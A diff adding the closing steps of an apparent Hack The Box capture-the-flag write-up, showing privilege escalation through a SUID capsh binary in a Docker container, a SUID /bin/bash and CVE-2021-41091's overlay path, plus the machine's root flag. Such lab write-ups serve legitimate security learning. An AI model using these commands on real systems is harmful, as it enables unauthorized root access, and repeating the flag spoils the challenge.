@@ -161,4 +161,40 @@ https://github.com/UncleJ4ck/CVE-2021-41091
 
 > RESULT
 
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/34289e8f-86b1-4fc1-87ca-d89cdef33a09)
 
+
+26. We failed to get shell, seems we need to set the docker we reversed shell before to root.
+27. Let's start by listing all the SUID binaries.
+
+> LISTING SUID BINARIES
+
+```
+find / -perm -4000 2>/dev/null
+```
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/aab1771a-90b2-49e1-b119-74b96c66a1a2)
+
+
+28. Based from this GTFOBINS documentary --> https://gtfobins.github.io/gtfobins/capsh/. **/sbin/capsh** should be our interest.
+29. We can run --> `capsh --gid=0 --uid=0 --` and immediately gained root.
+30. Now run `chmod u+s /bin/bash` (based from the first references we need to set this first).
+31. Finally go back to **marcus** shell and access this path --> `/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/bin/bash -p`.
+
+> RESULT
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/2b807b70-7f5a-40b4-b7e0-7a86c3c92c6e)
+
+
+32 Great! We success privesc.
+
+> GETTING ROOT FLAG
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/9632e290-fc39-4ddb-88dc-859a7f83b35c)
+
+
+## ROOT FLAG
+
+```
+2fef842ec68275d466a0861aa9acd7c5
+```
